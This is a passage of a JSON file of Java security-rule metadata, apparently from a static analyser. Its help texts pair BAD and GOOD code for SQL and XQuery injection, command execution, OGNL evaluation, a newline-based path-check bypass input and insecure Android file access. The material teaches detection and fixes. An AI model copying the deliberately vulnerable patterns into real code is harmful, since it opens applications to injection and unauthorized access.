m = p.matcher(path);\n\nif (m.matches()) {\n    // Protected page - check access token and redirect to login page\n} else {\n    // Not protected page - render content\n}\n\n// BAD: A string with line return e.g. `/protected/%0axyz` can bypass the path check\nboolean matches = path.matches(PROTECTED_PATTERN);\n\n// BAD: A string with line return e.g. `/protected/%0axyz` can bypass the path check\nboolean matches = Pattern.matches(PROTECTED_PATTERN, path);\n\nif (matches) {\n    // Protected page - check access token and redirect to login page\n} else {\n    // Not protected page - render content\n}\n\n```\n\n## References\n* Apache Shiro: [Address the RegexRequestMatcher issue in 1.9.1](https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b).\n* CVE-2022-32532: [Applications using RegExPatternMatcher with \".\" in the regular expression are possibly vulnerable to an authorization bypass](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532).\n* Common Weakness Enumeration: [CWE-625](https://cwe.mitre.org/data/definitions/625.html).\n* Common Weakness Enumeration: [CWE-863](https://cwe.mitre.org/data/definitions/863.html).\n"
  },
  "java/non-ssl-socket-factory": {
    "name": "Failure to use SSL socket factories",
    "description": "Connections that are specified by non-SSL socket factories can be intercepted by third parties.",
    "kind": "problem",
    "problem.severity": "recommendation",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/non-ssl-socket-factory",
    "tags": [
      "security",
      "external/cwe/cwe-319"
    ],
    "filename": "8b24eede-UseSSLSocketFactories",
    "language": "java",
    "help": "# Failure to use SSL socket factories\nVarious networking and Remote Method Invocation (RMI) methods may use `SocketFactories` to specify the kind of connections to use. Using the default factory or a non-SSL factory leads to vulnerable connections.\n\n\n## Recommendation\nUse SSL factories instead of the default factories. SSL factories can be found in `javax.net.ssl` or `java.rmi.ssl`. If you want to define your own custom factories, consider inheriting from one of the SSL factories.\n\n\n## Example\nThe following example shows two ways of using RMI to export an object. The first use of `exportObject` uses the default socket factories. The second use of `exportObject` uses explicit SSL factories, which are preferable.\n\n\n```java\npublic static void main(String[] args) {\n    {\n        try {\n            TestImpl obj = new TestImpl();\n\n            // BAD: default socket factory is used\n            Test stub = (Test) UnicastRemoteObject.exportObject(obj, 0);\n        } catch (Exception e) {\n            // fail\n        }\n    }\n\n    {\n        try {\n            TestImpl obj = new TestImpl();\n            SslRMIClientSocketFactory csf = new SslRMIClientSocketFactory();\n            SslRMIServerSocketFactory ssf = new SslRMIServerSocketFactory();\n\n            // GOOD: SSL factories are used\n            Test stub = (Test) UnicastRemoteObject.exportObject(obj, 0, csf, ssf);\n        } catch (Exception e) {\n            // fail\n        }\n    }\n}\n\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* Java API Specification: [ Class SSLSocketFactory](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/javax/net/ssl/SSLSocketFactory.html).\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "java/concatenated-sql-query": {
    "name": "Query built by concatenation with a possibly-untrusted string",
    "description": "Building a SQL or Java Persistence query by concatenating a possibly-untrusted string is vulnerable to insertion of malicious code.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/concatenated-sql-query",
    "tags": [
      "security",
      "external/cwe/cwe-089",
      "external/cwe/cwe-564"
    ],
    "filename": "e6f878a0-SqlConcatenated",
    "language": "java",
    "help": "# Query built by concatenation with a possibly-untrusted string\nEven when the components of a SQL query are not fully controlled by a user, it is a vulnerability to build the query by directly concatenating those components. Perhaps a separate vulnerability will allow the user to gain control of the component. As well, a user who cannot gain full control of an input might influence it enough to cause the SQL query to fail to run.\n\n\n## Recommendation\nUsually, it is better to use a SQL prepared statement than to build a complete SQL query with string concatenation. A prepared statement can include a wildcard, written as a question mark (?), for each part of the SQL query that is expected to be filled in by a different value each time it is run. When the query is later executed, a value must be supplied for each wildcard in the query.\n\nIn the Java Persistence Query Language, it is better to use queries with parameters than to build a complete query with string concatenation. A Java Persistence query can include a parameter placeholder for each part of the query that is expected to be filled in by a different value when run. A parameter placeholder may be indicated by a colon (:) followed by a parameter name, or by a question mark (?) followed by an integer position. When the query is later executed, a value must be supplied for each parameter in the query, using the `setParameter` method. Specifying the query using the `@NamedQuery` annotation introduces an additional level of safety: the query must be a constant string literal, preventing construction by string concatenation, and the only way to fill in values for parts of the query is by setting positional parameters.\n\nIt is good practice to use prepared statements (in SQL) or query parameters (in the Java Persistence Query Language) for supplying parameter values to a query, whether or not any of the parameters are directly traceable to user input. Doing so avoids any need to worry about quoting and escaping.\n\n\n## Example\nIn the following example, the code runs a simple SQL query in two different ways.\n\nThe first way involves building a query, `query1`, by concatenating the result of `getCategory` with some string literals. The result of `getCategory` can include special characters, or it might be refactored later so that it may return something that contains special characters.\n\nThe second way, which shows good practice, involves building a query, `query2`, with a single string literal that includes a wildcard (`?`). The wildcard is then given a value by calling `setString`. This version is immune to injection attacks, because any special characters in the result of `getCategory` are not given any special treatment.\n\n\n```java\n{\n    // BAD: the category might have SQL special characters in it\n    String category = getCategory();\n    Statement statement = connection.createStatement();\n    String query1 = \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\"\n        + category + \"' ORDER BY PRICE\";\n    ResultSet results = statement.executeQuery(query1);\n}\n\n{\n    // GOOD: use a prepared query\n    String category = getCategory();\n    String query2 = \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=? ORDER BY PRICE\";\n    PreparedStatement statement = connection.prepareStatement(query2);\n    statement.setString(1, category);\n    ResultSet results = statement.executeQuery();\n}\n```\n\n## References\n* OWASP: [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* SEI CERT Oracle Coding Standard for Java: [IDS00-J. Prevent SQL injection](https://wiki.sei.cmu.edu/confluence/display/java/IDS00-J.+Prevent+SQL+injection).\n* The Java Tutorials: [Using Prepared Statements](https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-564](https://cwe.mitre.org/data/definitions/564.html).\n"
  },
  "java/android/unsafe-content-uri-resolution": {
    "name": "Uncontrolled data used in content resolution",
    "description": "Resolving externally-provided content URIs without validation can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/android/unsafe-content-uri-resolution",
    "tags": [
      "security",
      "external/cwe/cwe-441",
      "external/cwe/cwe-610"
    ],
    "filename": "754f80c9-UnsafeContentUriResolution",
    "language": "java",
    "help": "# Uncontrolled data used in content resolution\nWhen an Android application wants to access data in a content provider, it uses the `ContentResolver` object. `ContentResolver`s communicate with an instance of a class that implements the `ContentProvider` interface via URIs with the `content://` scheme. The authority part (the first path segment) of the URI, passed as parameter to the `ContentResolver`, determines which content provider is contacted for the operation. Specific operations that act on files also support the `file://` scheme, in which case the local filesystem is queried instead. If an external component, like a malicious or compromised application, controls the URI for a `ContentResolver` operation, it can trick the vulnerable application into accessing its own private files or non-exported content providers. The attacking application might be able to get access to the file by forcing it to be copied to a public directory, like external storage, or tamper with the contents by making the application overwrite the file with unexpected data.\n\n\n## Recommendation\nIf possible, avoid using externally-provided data to determine the URI for a `ContentResolver` to use. If that is not an option, validate that the incoming URI can only reference trusted components, like an allow list of content providers and/or applications, or alternatively make sure that the URI does not reference private directories like `/data/`.\n\n\n## Example\nThis example shows three ways of opening a file using a `ContentResolver`. In the first case, externally-provided data from an intent is used directly in the file-reading operation. This allows an attacker to provide a URI of the form `/data/data/(vulnerable app package)/(private file)` to trick the application into reading it and copying it to the external storage. In the second case, an insufficient check is performed on the externally-provided URI, still leaving room for exploitation. In the third case, the URI is correctly validated before being used, making sure it does not reference any internal application files.\n\n\n```java\nimport android.content.ContentResolver;\nimport android.net.Uri;\n\npublic class Example extends Activity {\n    public void onCreate() {\n        // BAD: Externally-provided URI directly used in content resolution\n        {\n            ContentResolver contentResolver = getContentResolver();\n            Uri uri = (Uri) getIntent().getParcelableExtra(\"URI_EXTRA\");\n            InputStream is = contentResolver.openInputStream(uri);\n            copyToExternalCache(is);\n        }\n        // BAD: input URI is not normalized, and check can be bypassed with \"..\" characters\n        {\n            ContentResolver contentResolver = getContentResolver();\n            Uri uri = (Uri) getIntent().getParcelableExtra(\"URI_EXTRA\");\n            String path = uri.getPath();\n            if (path.startsWith(\"/data\"))\n                throw new SecurityException();\n            InputStream is = contentResolver.openInputStream(uri);\n            copyToExternalCache(is);\n        }\n        // GOOD: URI is properly validated to block access to internal files\n        {\n            ContentResolver contentResolver = getContentResolver();\n            Uri uri = (Uri) getIntent().getParcelableExtra(\"URI_EXTRA\");\n            String path = uri.getPath();\n            java.nio.file.Path normalized =\n                    java.nio.file.FileSystems.getDefault().getPath(path).normalize();\n            if (normalized.startsWith(\"/data\"))\n                throw new SecurityException();\n            InputStream is = contentResolver.openInputStream(uri);\n            copyToExternalCache(is);\n        }\n    }\n\n    private void copyToExternalCache(InputStream is) {\n        // Reads the contents of is and writes a file in the app's external\n        // cache directory, which can be read publicly by applications in the same device.\n    }\n}\n\n```\n\n## References\n* Android developers: [Content provider basics](https://developer.android.com/guide/topics/providers/content-provider-basics)\n* [The ContentResolver class](https://developer.android.com/reference/android/content/ContentResolver)\n* Common Weakness Enumeration: [CWE-441](https://cwe.mitre.org/data/definitions/441.html).\n* Common Weakness Enumeration: [CWE-610](https://cwe.mitre.org/data/definitions/610.html).\n"
  },
  "java/xquery-injection": {
    "name": "XQuery query built from user-controlled sources",
    "description": "Building an XQuery query from user-controlled sources is vulnerable to insertion of malicious XQuery code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/xquery-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-652"
    ],
    "filename": "80dacbcc-XQueryInjection",
    "language": "java",
    "help": "# XQuery query built from user-controlled sources\nThe software uses external input to dynamically construct an XQuery expression which is then used to retrieve data from an XML database. However, the input is not neutralized, or is incorrectly neutralized, which allows an attacker to control the structure of the query.\n\n\n## Recommendation\nUse parameterized queries. This will help ensure the program retains control of the query structure.\n\n\n## Example\nThe following example compares building a query by string concatenation (bad) vs. using `bindString` to parameterize the query (good).\n\n\n```java\nimport javax.servlet.http.HttpServletRequest;\nimport javax.xml.namespace.QName;\nimport javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQDataSource;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQItemType;\nimport javax.xml.xquery.XQPreparedExpression;\nimport javax.xml.xquery.XQResultSequence;\nimport net.sf.saxon.xqj.SaxonXQDataSource;\n\npublic void bad(HttpServletRequest request) throws XQException {\n    String name = request.getParameter(\"name\");\n    XQDataSource ds = new SaxonXQDataSource();\n    XQConnection conn = ds.getConnection();\n    String query = \"for $user in doc(\\\"users.xml\\\")/Users/User[name='\" + name + \"'] return $user/password\";\n    XQPreparedExpression xqpe = conn.prepareExpression(query);\n    XQResultSequence result = xqpe.executeQuery();\n    while (result.next()){\n        System.out.println(result.getItemAsString(null));\n    }\n}\n\npublic void bad1(HttpServletRequest request) throws XQException {\n    String name = request.getParameter(\"name\");\n    XQDataSource xqds = new SaxonXQDataSource();\n    String query = \"for $user in doc(\\\"users.xml\\\")/Users/User[name='\" + name + \"'] return $user/password\";\n    XQConnection conn = xqds.getConnection();\n    XQExpression expr = conn.createExpression();\n    XQResultSequence result = expr.executeQuery(query);\n    while (result.next()){\n        System.out.println(result.getItemAsString(null));\n    }\n}\n\npublic void bad2(HttpServletRequest request) throws XQException {\n    String name = request.getParameter(\"name\");\n    XQDataSource xqds = new SaxonXQDataSource();\n    XQConnection conn = xqds.getConnection();\n    XQExpression expr = conn.createExpression();\n    //bad code\n    expr.executeCommand(name);\n}\n\npublic void good(HttpServletRequest request) throws XQException {\n    String name = request.getParameter(\"name\");\n    XQDataSource ds = new SaxonXQDataSource();\n    XQConnection conn = ds.getConnection();\n    String query = \"declare variable $name as xs:string external;\"\n            + \" for $user in doc(\\\"users.xml\\\")/Users/User[name=$name] return $user/password\";\n    XQPreparedExpression xqpe = conn.prepareExpression(query);\n    xqpe.bindString(new QName(\"name\"), name, conn.createAtomicType(XQItemType.XQBASETYPE_STRING));\n    XQResultSequence result = xqpe.executeQuery();\n    while (result.next()){\n        System.out.println(result.getItemAsString(null));\n    }\n}\n\npublic void good1(HttpServletRequest request) throws XQException {\n    String name = request.getParameter(\"name\");\n    String query = \"declare variable $name as xs:string external;\"\n            + \" for $user in doc(\\\"users.xml\\\")/Users/User[name=$name] return $user/password\";\n    XQDataSource xqds = new SaxonXQDataSource();\n    XQConnection conn = xqds.getConnection();\n    XQExpression expr = conn.createExpression();\n    expr.bindString(new QName(\"name\"), name, conn.createAtomicType(XQItemType.XQBASETYPE_STRING));\n    XQResultSequence result = expr.executeQuery(query);\n    while (result.next()){\n        System.out.println(result.getItemAsString(null));\n    }\n}\n```\n\n## References\n* Balisage: [XQuery Injection](https://www.balisage.net/Proceedings/vol7/html/Vlist02/BalisageVol7-Vlist02.html).\n* Common Weakness Enumeration: [CWE-652](https://cwe.mitre.org/data/definitions/652.html).\n"
  },
  "java/android/sensitive-text": {
    "name": "Exposure of sensitive information to UI text views",
    "id": "java/android/sensitive-text",
    "kind": "path-problem",
    "description": "Sensitive information displayed in UI text views should be properly masked.",
    "problem.severity": "warning",
    "precision": "medium",
    "security-severity": 6.5,
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "filename": "c79ca7dc-AndroidSensitiveTextField",
    "language": "java",
    "help": "# Exposure of sensitive information to UI text views\nSensitive information such as passwords should not be displayed in UI components unless explicitly required, to mitigate shoulder-surfing attacks.\n\n\n## Recommendation\nFor editable text fields containing sensitive information, the `inputType` should be set to `textPassword` or similar to ensure it is properly masked. Otherwise, sensitive data that must be displayed should be hidden by default, and only revealed based on an explicit user action.\n\n\n## Example\nIn the following (bad) case, sensitive information in `password` is exposed to the `TextView`.\n\n\n```java\nTextView pwView = getViewById(R.id.pw_text);\npwView.setText(\"Your password is: \" + password);\n```\nIn the following (good) case, the user must press a button to reveal sensitive information.\n\n\n```java\nTextView pwView = findViewById(R.id.pw_text);\npwView.setVisibility(View.INVISIBLE);\npwView.setText(\"Your password is: \" + password);\n\nButton showButton = findViewById(R.id.show_pw_button);\nshowButton.setOnClickListener(new View.OnClickListener() {\n    public void onClick(View v) {\n      pwView.setVisibility(View.VISIBLE);\n    }\n});\n\n```\n\n## References\n* OWASP Mobile Application Security: [Android Data Storage - UI Components](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#ui-components)\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/server-directory-listing": {
    "name": "Directories and files exposure",
    "description": "A directory listing provides an attacker with the complete index of all the resources located inside of the complete web directory, which could yield files containing sensitive information like source code and credentials to the attacker.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/server-directory-listing",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-548"
    ],
    "filename": "cc9d1d3a-InsecureDirectoryConfig",
    "language": "java",
    "help": "# Directories and files exposure\nEnabling directory listing in J2EE application servers introduces the vulnerability of filename and path disclosure, which could allow an attacker to read arbitrary files in the server web directory. This includes application source code and data, as well as credentials for back-end systems.\n\nThe query detects insecure configuration by validating its web configuration.\n\n\n## Recommendation\nAlways disabling directory listing in the production environment.\n\n\n## Example\nThe following two examples show two ways of directory listing configuration. In the 'BAD' case, it is enabled. In the 'GOOD' case, it is disabled.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\n                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\">\n\n    <!-- The default servlet for all web applications, that serves static     -->\n    <!-- resources.  It processes all requests that are not mapped to other   -->\n    <!-- servlets with servlet mappings (defined either here or in your own   -->\n    <!-- web.xml file).                                                       -->\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>listings</param-name>\n            <!-- GOOD: Don't allow directory listing -->\n            <param-value>false</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet>\n        <servlet-name>default</servlet-name>\n        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n        <init-param>\n            <param-name>listings</param-name>\n            <!-- BAD: Allow directory listing -->\n            <param-value>true</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n</web-app>\n```\n\n## References\n* [CWE-548: Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html) [Directory listing](https://portswigger.net/kb/issues/00600100_directory-listing) [Directory traversal](https://portswigger.net/web-security/file-path-traversal)\n* Common Weakness Enumeration: [CWE-548](https://cwe.mitre.org/data/definitions/548.html).\n"
  },
  "java/ognl-injection": {
    "name": "OGNL Expression Language statement with user-controlled input",
    "description": "Evaluation of OGNL Expression Language statement with user-controlled input can lead to execution of arbitrary code.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/ognl-injection",
    "tags": [
      "security",
      "external/cwe/cwe-917"
    ],
    "filename": "3332ec87-OgnlInjection",
    "language": "java",
    "help": "# OGNL Expression Language statement with user-controlled input\nObject-Graph Navigation Language (OGNL) is an open-source Expression Language (EL) for Java. OGNL can create or change executable code, consequently it can introduce critical security flaws to any application that uses it. Evaluation of unvalidated expressions is a common flaw in OGNL. This exposes the properties of Java objects to modification by an attacker and may allow them to execute arbitrary code.\n\n\n## Recommendation\nThe general recommendation is to avoid evaluating untrusted ONGL expressions. If user-provided OGNL expressions must be evaluated, do this in a sandbox and validate the expressions before evaluation.\n\n\n## Example\nIn the following examples, the code accepts an OGNL expression from the user and evaluates it.\n\nIn the first example, the user-provided OGNL expression is parsed and evaluated.\n\nThe second example validates the expression and evaluates it inside a sandbox. You can add a sandbox by setting a system property, as shown in the example, or by adding `-Dognl.security.manager` to JVM arguments.\n\n\n```java\nimport ognl.Ognl;\nimport ognl.OgnlException;\n\npublic void evaluate(HttpServletRequest request, Object root) throws OgnlException {\n  String expression = request.getParameter(\"expression\");\n\n  // BAD: User provided expression is evaluated\n  Ognl.getValue(expression, root);\n  \n  // GOOD: The name is validated and expression is evaluated in sandbox\n  System.setProperty(\"ognl.security.manager\", \"\"); // Or add -Dognl.security.manager to JVM args\n  if (isValid(expression)) {\n    Ognl.getValue(expression, root);\n  } else {\n    // Reject the request\n  }\n}\n\npublic void isValid(Strig expression) {\n  // Custom method to validate the expression.\n  // For instance, make sure it doesn't include unexpected code.\n}\n\n```\n\n## References\n* Apache Commons: [Apache Commons OGNL](https://commons.apache.org/proper/commons-ognl/).\n* Struts security: [Proactively protect from OGNL Expression Injections attacks](https://struts.apache.org/security/#proactively-protect-from-ognl-expression-injections-attacks-if-easily-applicable).\n* Common Weakness Enumeration: [CWE-917](https://cwe.mitre.org/data/definitions/917.html).\n"
  },
  "java/insecure-webview-resource-response": {
    "name": "Insecure Android WebView Resource Response",
    "description": "An insecure implementation of Android `WebResourceResponse` may lead to leakage of arbitrary sensitive content.",
    "kind": "path-problem",
    "id": "java/insecure-webview-resource-response",
    "problem.severity": "error",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-200"
    ],
    "filename": "6294e7f1-InsecureWebResourceResponse",
    "language": "java",
    "help": "# Insecure Android WebView Resource Response\nAndroid provides a `WebResourceResponse` class, which allows an Android application to behave as a web server by handling requests of popular protocols such as `http(s)`, `file`, as well as `javascript` and returning a response (including status code, content type, content encoding, headers and the response body). Improper implementation with insufficient input validation can lead to leakage of sensitive configuration files or user data because requests could refer to paths intended to be application-private.\n\n\n## Recommendation\nUnsanitized user-provided URLs must not be used to serve a response directly. When handling a request, always validate that the requested file path is not in the receiver's protected directory. Alternatively the Android class `WebViewAssetLoader` can be used, which safely processes data from resources, assets or a predefined directory.\n\n\n## Example\nThe following examples show a bad scenario and two good scenarios respectively. In the bad scenario, a response is served without path validation. In the good scenario, a response is either served with path validation or through the safe `WebViewAssetLoader` implementation.\n\n\n```java\n// BAD: no URI validation\nUri uri = Uri.parse(url);\nFileInputStream inputStream = new FileInputStream(uri.getPath());\nString mimeType = getMimeTypeFromPath(uri.getPath());\nreturn new WebResourceResponse(mimeType, \"UTF-8\", inputStream);\n\n\n// GOOD: check for a trusted prefix, ensuring path traversal is not used to erase that prefix:\n// (alternatively use `WebViewAssetsLoader`)\nif (uri.getPath().startsWith(\"/local_cache/\") && !uri.getPath().contains(\"..\")) {\n    File cacheFile = new File(getCacheDir(), uri.getLastPathSegment());\n    FileInputStream inputStream = new FileInputStream(cacheFile);\n    String mimeType = getMimeTypeFromPath(uri.getPath());\n    return new WebResourceResponse(mimeType, \"UTF-8\", inputStream);\n}\n\nreturn assetLoader.shouldInterceptRequest(request.getUrl());\n\n```\n\n## References\n* Oversecured: [Android: Exploring vulnerabilities in WebResourceResponse](https://blog.oversecured.com/Android-Exploring-vulnerabilities-in-WebResourceResponse/).\n* CVE: [CVE-2014-3502: Cordova apps can potentially leak data to other apps via URL loading](https://cordova.apache.org/announcements/2014/08/04/android-351.html).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/stack-trace-exposure": {
    "name": "Information exposure through a stack trace",
    "description": "Information from a stack trace propagates to an external user. Stack traces can unintentionally reveal implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 5.4,
    "precision": "high",
    "id": "java/stack-trace-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209",
      "external/cwe/cwe-497"
    ],
    "filename": "f818b028-StackTraceExposure",
    "language": "java",
    "help": "# Information exposure through a stack trace\nSoftware developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.\n\nUnfortunately, the same information can be useful to an attacker. The sequence of class names in a stack trace can reveal the structure of the application as well as any internal components it relies on.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.\n\n\n## Example\nIn the following example, an exception is handled in two different ways. In the first version, labeled BAD, the exception is sent back to the remote user using the `sendError()` method. As such, the user is able to see a detailed stack trace, which may contain sensitive information. In the second version, the error message is logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information.\n\n\n```java\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) {\n\ttry {\n\t\tdoSomeWork();\n\t} catch (NullPointerException ex) {\n\t\t// BAD: printing a stack trace back to the response\n\t\tex.printStackTrace(response.getWriter());\n\t\treturn;\n\t}\n\n\ttry {\n\t\tdoSomeWork();\n\t} catch (NullPointerException ex) {\n\t\t// GOOD: log the stack trace, and send back a non-revealing response\n\t\tlog(\"Exception occurred\", ex);\n\t\tresponse.sendError(\n\t\t\tHttpServletResponse.SC_INTERNAL_SERVER_ERROR,\n\t\t\t\"Exception occurred\");\n\t\treturn;\n\t}\n}\n\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* CERT Java Coding Standard: [ERR01-J. Do not allow exceptions to expose sensitive information](https://www.securecoding.cert.org/confluence/display/java/ERR01-J.+Do+not+allow+exceptions+to+expose+sensitive+information).\n* Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "java/command-line-injection": {
    "name": "Uncontrolled command line",
    "description": "Using externally controlled strings in a command line is vulnerable to malicious changes in the strings.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/command-line-injection",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "f03693da-ExecTainted",
    "language": "java",
    "help": "# Uncontrolled command line\nCode that passes user input directly to `Runtime.exec`, or some other library routine that executes a command, allows the user to execute malicious code.\n\n\n## Recommendation\nIf possible, use hard-coded string literals to specify the command to run or library to load. Instead of passing the user input directly to the process or library function, examine the user input and then choose among hard-coded string literals.\n\nIf the applicable libraries or commands cannot be determined at compile time, then add code to verify that the user input string is safe before using it.\n\n\n## Example\nThe following example shows code that takes a shell script that can be changed maliciously by a user, and passes it straight to `Runtime.exec` without examining it first.\n\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        String script = System.getenv(\"SCRIPTNAME\");\n        if (script != null) {\n            // BAD: The script to be executed is controlled by the user.\n            Runtime.getRuntime().exec(script);\n        }\n    }\n}\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* SEI CERT Oracle Coding Standard for Java: [IDS07-J. Sanitize untrusted data passed to the Runtime.exec() method](https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec()+method).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "java/maven/dependency-upon-bintray": {
    "name": "Depending upon JCenter/Bintray as an artifact repository",
    "description": "Using a deprecated artifact repository may eventually give attackers access for a supply chain attack.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 6.5,
    "precision": "very-high",
    "id": "java/maven/dependency-upon-bintray",
    "tags": [
      "security",
      "external/cwe/cwe-1104"
    ],
    "filename": "4518e3e9-MavenPomDependsOnBintray",
    "language": "java",
    "help": "# Depending upon JCenter/Bintray as an artifact repository\n[Bintray and JCenter are shutting down on February 1st, 2022](https://jfrog.com/blog/into-the-sunset-bintray-jcenter-gocenter-and-chartcenter/). Relying upon repositories that are deprecated or scheduled to be shutdown can have unintended consequences; for example, artifacts being resolved from a different artifact server or a total failure of the CI build.\n\nWhen artifact repositories are left unmaintained for a long period of time, vulnerabilities may emerge. Theoretically, this could allow attackers to inject malicious code into the artifacts that you are resolving and infect build artifacts that are being produced. This can be used by attackers to perform a [supply chain attack](https://en.wikipedia.org/wiki/Supply_chain_attack) against your project's users.\n\n\n## Recommendation\nAlways use the canonical repository for resolving your dependencies.\n\n\n## Example\nThe following example shows locations in a Maven POM file where artifact repository upload/download is configured. The use of Bintray in any of these locations is not advised.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.semmle</groupId>\n    <artifactId>parent</artifactId>\n    <version>1.0</version>\n    <packaging>pom</packaging>\n\n    <name>Bintray Usage</name>\n    <description>An example of using bintray to download and upload dependencies</description>\n\n    <distributionManagement>\n        <repository>\n            <id>jcenter</id>\n            <name>JCenter</name>\n            <!-- BAD! Don't use JCenter -->\n            <url>https://jcenter.bintray.com</url>\n        </repository>\n        <snapshotRepository>\n            <id>jcenter-snapshots</id>\n            <name>JCenter</name>\n            <!-- BAD! Don't use JCenter -->\n            <url>https://jcenter.bintray.com</url>\n        </snapshotRepository>\n    </distributionManagement>\n    <repositories>\n        <repository>\n            <id>jcenter</id>\n            <name>JCenter</name>\n            <!-- BAD! Don't use JCenter -->\n            <url>https://jcenter.bintray.com</url>\n        </repository>\n    </repositories>\n    <repositories>\n        <repository>\n            <id>jcenter</id>\n            <name>JCenter</name>\n            <!-- BAD! Don't use Bintray -->\n            <url>https://dl.bintray.com/groovy/maven</url>\n        </repository>\n    </repositories>\n    <pluginRepositories>\n        <pluginRepository>\n            <id>jcenter-plugins</id>\n            <name>JCenter</name>\n            <!-- BAD! Don't use JCenter -->\n            <url>https://jcenter.bintray.com</url>\n        </pluginRepository>\n    </pluginRepositories>\n</project>\n\n```\n\n## References\n* JFrog blog: [ Into the Sunset on May 1st: Bintray, JCenter, GoCenter, and ChartCenter ](https://jfrog.com/blog/into-the-sunset-bintray-jcenter-gocenter-and-chartcenter/)\n* Common Weakness Enumeration: [CWE-1104](https://cwe.mitre.org/data/definitions/1104.html).\n"
  },
  "java/android/webview-addjavascriptinterface": {
    "name": "Access Java object methods through JavaScript exposure",
    "id": "java/android/webview-addjavascriptinterface",
    "description": "Exposing a Java object in a WebView with a JavaScript interface can lead to malicious JavaScript controlling the application.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-079"
    ],
    "filename": "918405f7-AndroidWebViewAddJavascriptInterface",
    "language": "java",
